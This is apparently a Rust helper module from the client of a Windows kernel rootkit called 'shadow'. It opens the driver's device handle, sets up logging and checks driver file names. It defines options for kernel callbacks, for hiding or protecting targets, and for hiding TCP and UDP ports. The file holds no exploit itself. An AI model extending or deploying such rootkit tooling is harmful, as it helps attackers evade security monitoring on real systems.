use {
    log::*,
    colored::Colorize,
    env_logger::Builder,
    std::{path::Path, ptr::null_mut, io::Write},
    windows_sys::{
        w,
        Win32::{
            Foundation::{
                GetLastError, GENERIC_READ, GENERIC_WRITE, 
                HANDLE, INVALID_HANDLE_VALUE
            },
            Storage::FileSystem::{
                CreateFileW, FILE_ATTRIBUTE_NORMAL,
                OPEN_EXISTING,
            },
        },
    },   
};


/// Checks if the given file exists.
///
/// # Parameters
///
/// - `file` - A string reference representing the file path.
///
/// # Returns
///
/// - `true` if the file exists, `false` otherwise.
pub fn check_file(file: &String) -> bool {
    let file = Path::new(file);
    file.exists()
}

/// Opens a handle to the driver with the name `shadow`.
///
/// # Returns
///
/// - `Ok(HANDLE)` if the driver handle is successfully opened.
/// - `Err(())` if there is an error.
/// 
pub fn open_driver() -> Result<HANDLE, ()> {
    info!("Opening driver handle");
    
    let h_file = unsafe {
        CreateFileW(
            w!("\\\\.\\shadow"),
            GENERIC_READ | GENERIC_WRITE,
            0,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0, 
        )
    };

    if h_file == INVALID_HANDLE_VALUE {
        error!("CreateFileW failed with error: {:?}", unsafe { GetLastError() });
        return Err(());
    }

    info!("Driver handle successfully opened");
    Ok(h_file)
}

/// Initializes the logger with the specified verbosity level.
///
/// # Parameters
///
/// - `verbose` - A `u8` representing the verbosity level. 
///    - `0` for `Info` level.
///    - Any non-zero value for `Debug` level.
/// 
pub fn init_logger(verbose: u8) {
    let mut builder = Builder::new();
    let log_level = match verbose {
        0 => LevelFilter::Info,
        _ => LevelFilter::Debug,
    };

    builder
        .filter(None, log_level)
        .format(|buf, record| {
            let timestamp = chrono::Local::now().format("%Y-%m-%dT%H:%M:%S");
            let level = match record.level() {
                Level::Error => "ERROR".red().bold(),
                Level::Warn => "WARN ".yellow().bold(),
                Level::Info => "INFO ".green(),
                Level::Debug => "DEBUG".bright_black(),
                Level::Trace => "TRACE".blue(),
            };

            writeln!(buf, "[{}] {} [shadow] {}", timestamp, level, record.args())
        })
        .init();
}

/// Validates that a given file has a `.sys` extension.
///
/// # Parameters
///
/// - `val` - A string slice representing the file name.
///
/// # Returns
///
/// - `Ok(String)` if the file has a `.sys` extension.
/// - `Err(String)` if the file does not have a `.sys` extension.
/// 
pub fn validate_sys_extension(val: &str) -> Result<String, String> {
    if val.ends_with(".sys") {
        Ok(val.to_string())
    } else {
        Err(String::from("The driver file must have a .sys extension"))
    }
}

/// Enum representing different callbacks in the system.
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum Callbacks {
    /// Callback for process creation notifications.
    Process,
    /// Callback for thread creation notifications.
    Thread,
    /// Callback for image loading notifications.
    LoadImage,
    /// Callback for registry changes.
    Registry,
    /// Callback for object processing.
    ObProcess,
    /// Callback for thread object processing.
    ObThread,
}

impl Callbacks {
    /// Maps the current callback to a corresponding shared enum.
    ///
    /// # Returns
    ///
    /// A `shared::enums::Callbacks` variant corresponding to the selected callback.
    /// 
    pub fn to_shared(self) -> shared::enums::Callbacks {
        match self {
            Callbacks::Process => shared::enums::Callbacks::PsSetCreateProcessNotifyRoutine,
            Callbacks::Thread => shared::enums::Callbacks::PsSetCreateThreadNotifyRoutine,
            Callbacks::LoadImage => shared::enums::Callbacks::PsSetLoadImageNotifyRoutine,
            Callbacks::Registry => shared::enums::Callbacks::CmRegisterCallbackEx,
            Callbacks::ObProcess => shared::enums::Callbacks::ObProcess,
            Callbacks::ObThread => shared::enums::Callbacks::ObThread,
        }
    }
}

/// Enum representing various options.
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum Options {
    /// Option to hide targets.
    Hide,
    /// Option to protect targets (disabled if the `mapper` feature is enabled).
    #[cfg(not(feature = "mapper"))]
    Protection,
}

impl Options {
    /// Maps the current option to a corresponding shared enum.
    ///
    /// # Returns
    ///
    /// A `shared::enums::Options` variant corresponding to the selected option.
    /// 
    pub fn to_shared(self) -> shared::enums::Options {
        match self {
            Options::Hide => shared::enums::Options::Hide,
            #[cfg(not(feature = "mapper"))]
            Options::Protection => shared::enums::Options::Protection,
        }
    }
}

/// Enum representing network protocols.
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum Protocol {
    /// Transmission Control Protocol (TCP).
    TCP,
    /// User Datagram Protocol (UDP).
    UDP,
}

impl Protocol {
    /// Maps the current protocol to a corresponding shared enum.
    ///
    /// # Returns
    ///
    /// A `shared::enums::Protocol` variant corresponding to the selected protocol.
    /// 
    pub fn to_shared(self) -> shared::enums::Protocol {
        match self {
            Protocol::TCP => shared::enums::Protocol::TCP,
            Protocol::UDP => shared::enums::Protocol::UDP,
        }
    }
}

/// Enum representing the type of port (Local or Remote).
#[derive(clap::ValueEnum, Clone, Debug, Copy)]
pub enum PortType {
    /// Local port.
    LOCAL,
    /// Remote port.
    REMOTE,
}

impl PortType {
    /// Maps the current port type to a corresponding shared enum.
    ///
    /// # Returns
    ///
    /// A `shared::enums::PortType` variant corresponding to the selected port type.
    /// 
    pub fn to_shared(self) -> shared::enums::PortType {
        match self {
            PortType::LOCAL => shared::enums::PortType::LOCAL,
            PortType::REMOTE => shared::enums::PortType::REMOTE,
        }
    }
}
